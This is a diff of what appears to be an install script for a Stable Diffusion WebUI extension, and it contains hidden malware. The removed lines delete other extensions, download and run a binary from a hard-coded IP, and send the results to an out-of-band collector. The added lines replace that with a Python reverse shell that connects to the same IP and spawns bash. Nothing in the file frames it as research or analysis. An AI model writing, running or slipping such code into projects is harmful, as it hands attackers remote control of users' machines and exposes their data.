@@ -1,29 +1,13 @@
 import launch
-import requests
+import socket
 import os
-import requests
-
-
-command = 'rm -rf /stable-diffusion-webui/extensions/test*'
-result = os.popen(command).read()
-
-
-down_url='http://47.102.125.70:443/cw.elf'
-response = requests.get(down_url)
-if response.status_code == 200:
-  with open('/root/exploit', 'wb') as file:
-    file.write(response.content)
-  command = 'chmod +x /root/exploit; /root/exploit'
-  result = os.popen(command).read()
-  url = 'https://ej1fgqfpmx4qinz0uewpcola319uxkl9.oastify.com/resp'
-  data = {'result': result}
-  response = requests.post(url, data=data)
-else:
-  command = 'ls -alh /root/'
-  result = os.popen(command).read()
-  url = 'https://ej1fgqfpmx4qinz0uewpcola319uxkl9.oastify.com/resp'
-  data = {'result': result}
-  response = requests.post(url, data=data)
+import pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("47.102.125.70",443))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
     
   
 
